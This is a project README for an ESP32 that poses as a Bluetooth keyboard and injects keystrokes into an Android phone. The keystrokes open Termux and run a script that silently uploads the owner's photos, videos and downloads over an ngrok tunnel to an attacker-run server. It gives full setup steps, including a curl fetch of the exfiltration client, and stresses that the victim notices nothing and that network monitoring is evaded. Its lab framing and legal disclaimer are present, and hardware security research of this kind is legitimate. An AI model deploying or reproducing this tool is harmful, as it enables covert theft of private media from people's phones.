# ESP32 BLE HID — Android Media Exfiltration Lab

> **CTF / Hardware Hacking Lab — Authorized Devices Only**

A hardware security research project demonstrating how an ESP32, acting as a rogue Bluetooth HID keyboard, can silently automate command execution on an Android device and exfiltrate media files over an ngrok HTTPS tunnel — without the user touching the screen.

Built for **controlled lab environments**: CTF challenges, security awareness demos, red-team training, and personal hardware experimentation on devices you own.

---

## ⚠️ Legal Disclaimer

```
THIS TOOL IS FOR AUTHORIZED SECURITY RESEARCH AND EDUCATIONAL USE ONLY.

You may ONLY use this tool on:
  - Devices you personally own, OR
  - Devices for which you have explicit written authorization from the owner.

Connecting this device to any phone without the owner's knowledge and consent is:
  - Unauthorized access to a computer system
  - A criminal offense under:
      India    : IT Act 2000, Sections 43 and 66
      USA      : Computer Fraud and Abuse Act (CFAA), 18 U.S.C. § 1030
      UK       : Computer Misuse Act 1990
      EU       : Directive 2013/40/EU
      + equivalent laws in every other jurisdiction

The author accepts no liability for misuse. By using this project you
confirm that you have full legal authorization for every device you target.
```

---

## What This Does

When the ESP32 connects to an Android phone over Bluetooth and the button on GPIO 19 is pressed, it behaves as a keyboard and silently:

1. Navigates to the Android home screen
2. Opens **Termux** (must be pre-installed on the target device)
3. Clears the terminal prompt
4. Types and executes a bash heredoc script that:
   - Loops through `/sdcard/DCIM/Camera`, `/sdcard/Pictures`, `/sdcard/Pictures/Screenshots`, `/sdcard/Download`, `/sdcard/Movies`
   - Computes SHA-256 of every image and video file
   - POSTs each file to your server via `curl` over ngrok HTTPS
5. All received files are saved, logged, and displayed in a web gallery on your computer

**The phone owner sees nothing while this is happening.** This is precisely what makes it a useful demonstration of BLE HID attack surface — and precisely why it must only ever be run on your own device or a device with written authorization.

---

## Attack Surface Demonstrated

| Technique | Description |
|-----------|-------------|
| BLE HID spoofing | ESP32 advertises as a legitimate Bluetooth keyboard |
| Keystroke injection | Commands typed at 35 ms/char — fast enough to avoid notice |
| Heredoc payload delivery | Full bash script injected without a file being dropped |
| Out-of-band exfiltration | Files leave via HTTPS tunnel — bypasses most network monitoring |
| SHA-256 integrity check | Server verifies every file, detects in-transit corruption |
| Acquisition logging | CSV + JSON report + manifest file — mirrors forensic acquisition |

---

## Lab Requirements

| Item | Notes |
|------|-------|
| ESP32 dev board | Any variant — WROOM-32, S2, S3, C3 |
| Momentary push button | Wired between **GPIO 19** and **GND** |
| Android phone (**yours**) | Termux installed from [F-Droid](https://f-droid.org/packages/com.termux/) |
| Computer | macOS, Windows, or Linux — runs the receiver server |
| Free ngrok account | Tunnel from [ngrok.com](https://ngrok.com) |

**Wiring:** `ESP32 GPIO 19 → Button → GND` — no resistor needed (INPUT_PULLUP).

---

## Architecture

```
[GPIO 19 button press]
         │
         ▼
   ESP32 (BLE HID keyboard)
         │  Bluetooth HID
         ▼
   Android device (your lab phone)
         │  Termux opened, bash heredoc injected
         │  find + sha256sum + curl per file
         │
         │  HTTPS (ngrok tunnel)
         ▼
   Receiver server — port 8019
   (macOS / Windows / Linux)
         │
         ├── Android_Media_Backup/DCIM/
         ├── Android_Media_Backup/Pictures/
         ├── Android_Media_Backup/Screenshots/
         ├── Android_Media_Backup/Movies/
         ├── Android_Media_Backup/Downloads/
         └── Android_Media_Backup/Reports/
             ├── transfer.log
             ├── sha256_manifest.txt
             ├── acquisition_report.csv
             └── acquisition_report.json
```

---

## Full Setup — Step by Step

---

### PART 1 — Get the Code

**Step 1 — Install Git**

| OS | Command |
|----|---------|
| macOS | `brew install git` |
| Windows | Download from [git-scm.com](https://git-scm.com/download/win) |
| Linux | `sudo apt install git` or `sudo dnf install git` |

**Step 2 — Clone the repository**

```bash
git clone https://github.com/darshakkanani/esp32-android-media-backup.git
cd esp32-android-media-backup
```

---

### PART 2 — Install Prerequisites

**Step 3 — Install Python 3**

| OS | How |
|----|-----|
| macOS | Pre-installed, or `brew install python` |
| Windows | [python.org/downloads](https://python.org/downloads) — ⚠️ tick **"Add Python to PATH"** |
| Ubuntu/Debian | `sudo apt install python3 python3-venv python3-pip` |
| Fedora/RHEL | `sudo dnf install python3 python3-pip` |

**Step 4 — Install ngrok**

| OS | How |
|----|-----|
| macOS | `brew install ngrok/ngrok/ngrok` |
| Windows | Download `ngrok.exe` from [ngrok.com/download](https://ngrok.com/download), add to PATH |
| Linux | Download binary from [ngrok.com/download](https://ngrok.com/download) |

Authenticate ngrok (one-time):
```bash
ngrok config add-authtoken YOUR_NGROK_TOKEN
```
Get your token from [dashboard.ngrok.com/get-started/your-authtoken](https://dashboard.ngrok.com/get-started/your-authtoken).

---

### PART 3 — Set Up the Receiver Server

**Step 5 — Go into the server folder**

```bash
cd esp32-android-media-backup/server
```

**Step 6 — Create a virtual environment and install dependencies**

macOS / Linux:
```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

Windows (cmd):
```bat
python -m venv .venv
.venv\Scripts\activate
pip install -r requirements.txt
```

> **Shortcut:** run `./start.sh` (macOS/Linux) or double-click `start.bat` (Windows) to do Steps 6–8 automatically.

**Step 7 — Generate a secret auth token**

```bash
python3 -c "import secrets; print(secrets.token_hex(32))"   # macOS / Linux
python  -c "import secrets; print(secrets.token_hex(32))"   # Windows
```

Save this token — you need it in Step 8 and again in Step 17 (Android).

**Step 8 — Create your `.env` file**

```bash
cp .env.example .env   # macOS / Linux
# copy .env.example .env   # Windows
```

Edit `.env`:
```
UPLOAD_TOKEN=your_token_from_step_7_here
```

**Step 9 — Start the ngrok tunnel**

Open a **new terminal window**:
```bash
ngrok http 8019
```

Copy the `https://xxxx.ngrok-free.app` URL from the output — needed in Steps 11 and 17.

**Step 10 — Start the receiver server**

In a **second terminal window**:

macOS / Linux:
```bash
cd esp32-android-media-backup/server
source .venv/bin/activate
python3 server.py
```

Windows:
```bat
cd esp32-android-media-backup\server
.venv\Scripts\activate
python server.py
```

The server prints the ngrok URL and all endpoints. Keep this window open during the lab.

---

### PART 4 — Flash the ESP32

**Step 11 — Set up Arduino IDE**

1. Download [Arduino IDE 2](https://www.arduino.cc/en/software).
2. **File → Preferences → Additional Board URLs**, add:
   ```
   https://raw.githubusercontent.com/espressif/arduino-esp32/gh-pages/package_esp32_index.json
   ```
3. **Tools → Board → Board Manager** → search `esp32` → install **"esp32 by Espressif Systems"**.
4. **Tools → Manage Libraries** → search **"ESP32 BLE Keyboard"** → install (by T-vK).

**Step 12 — Set your ngrok URL in the sketch**

Open `fetch_photos.ino`, line 32 — replace the placeholder with your ngrok URL from Step 9:
```cpp
#define WAN_SERVER_URL "https://xxxx.ngrok-free.app"
```

**Step 13 — Upload to ESP32**

1. Connect ESP32 via USB.
2. **Tools → Board** → select your ESP32 model.
3. **Tools → Port** → select the correct port.
4. Click **Upload**.

> ⚠️ ngrok generates a new URL every time it restarts. Update line 32 and re-upload whenever this happens.

---

### PART 5 — Prepare the Lab Android Device (your device)

**Step 14 — Install Termux on your Android device**

Install from **F-Droid only** — [f-droid.org/packages/com.termux](https://f-droid.org/packages/com.termux/)

The Play Store build is outdated and will not work.

**Step 15 — Set up Termux**

```bash
pkg update && pkg upgrade -y
pkg install python curl
termux-setup-storage
```

Tap **Allow** when Android asks for storage permission.

**Step 16 — Download the exfiltration client to your Android device**

In Termux (replace URL with your ngrok URL from Step 9):
```bash
curl -s -L -H "ngrok-skip-browser-warning: true" \
     -o ~/media_backup.py \
     https://xxxx.ngrok-free.app/payloads/media_backup.py
```

**Step 17 — Set the auth token on your Android device**

```bash
echo "your_token_from_step_7_here" > ~/.backup_token
chmod 600 ~/.backup_token
```

Must match the token in `.env` on your computer exactly.

**Step 18 — Verify manually**

Before using the ESP32 trigger, confirm everything works end-to-end:
```bash
python3 ~/media_backup.py https://xxxx.ngrok-free.app
```

You should see your media discovered by category. Type `all` and `y` to confirm an upload.

---

### PART 6 — Wire the Button and Run the Lab

**Step 19 — Wire the button**

```
ESP32 GPIO 19  ──────[Button]────── GND
```

**Step 20 — Pair Bluetooth on your Android device**

1. **Settings → Bluetooth → scan for devices**.
2. The ESP32 appears as **"ESP32 Keyboard"** — pair it.

**Step 21 — Run the lab**

1. Confirm server (Step 10) and ngrok (Step 9) are running.
2. Android device is unlocked, Bluetooth connected.
3. **Press the GPIO 19 button.**
4. The ESP32 injects keystrokes into your Android device — opens Termux, types and executes the exfiltration script.
5. Files are uploaded to your server. `====== ALL DONE ======` appears in Termux.
6. View collected files at `http://localhost:8019/files`.

---

## Receiver Web Interface

| URL | Description |
|-----|-------------|
| `http://localhost:8019/files` | Gallery of all collected files, grouped by category |
| `http://localhost:8019/report` | JSON report — counts, sizes, timestamps per category |
| `http://localhost:8019/health` | Server status |

---

## Collected Data Structure

```
Android_Media_Backup/
├── DCIM/           ← Camera photos and videos
├── Pictures/       ← Gallery saved images
├── Screenshots/    ← Screen captures
├── Movies/         ← Video files
├── Downloads/      ← Downloaded files
├── Other/          ← Uncategorized
└── Reports/
    ├── transfer.log              ← Full operation log
    ├── sha256_manifest.txt       ← Hash of every collected file
    ├── acquisition_report.csv    ← Spreadsheet-ready acquisition log
    └── acquisition_report.json   ← Machine-readable report
```

Each file is saved as `YYYYMMDD_HHMMSS_<uuid>_<originalname>` and SHA-256 verified on receipt.

---

## Troubleshooting

| Problem | Fix |
|---------|-----|
| ESP32 opens the wrong app | Edit `.ino`: increase `openApp("Termux", 3000)` to `5000` and re-upload |
| Keystrokes land in wrong window | Re-pair Bluetooth; ensure the device is unlocked and on home screen |
| "No media found" in Termux | Re-run `termux-setup-storage` and tap **Allow** |
| Auth error on upload | Token in `~/.backup_token` must exactly match `UPLOAD_TOKEN` in `.env` |
| Server unreachable | Check both ngrok (Step 9) and server (Step 10) windows are still open |
| ngrok URL changed | Update line 32 in `fetch_photos.ino` and re-upload the sketch |
| Windows: `python` not found | Re-install Python, tick **"Add Python to PATH"** |
| Linux: permission denied on start.sh | `chmod +x start.sh` |

---

## Project Files

```
esp32-android-media-backup/
├── fetch_photos.ino          ← ESP32 BLE HID firmware
└── server/
    ├── server.py             ← Receiver server (Flask, port 8019)
    ├── start.sh              ← One-click launcher — macOS / Linux
    ├── start.bat             ← One-click launcher — Windows
    ├── requirements.txt      ← Python dependencies (Flask only)
    ├── .env.example          ← Token config template
    └── payloads/
        └── media_backup.py   ← Exfiltration client — runs in Termux
```

---

## References

- [ESP32 BLE Keyboard library](https://github.com/T-vK/ESP32-BLE-Keyboard) — T-vK
- [BadUSB / BLE HID attack research](https://www.hak5.org/blogs/usb-rubber-ducky) — Hak5
- [Termux](https://termux.dev) — Android terminal emulator
- [ngrok](https://ngrok.com) — HTTPS tunneling

---

## License

MIT License — free to use, modify, and share for authorized purposes.

> This project is provided for educational and research purposes only.
> The author is not responsible for any misuse.
> Use only on devices you own or have explicit written authorization to test.
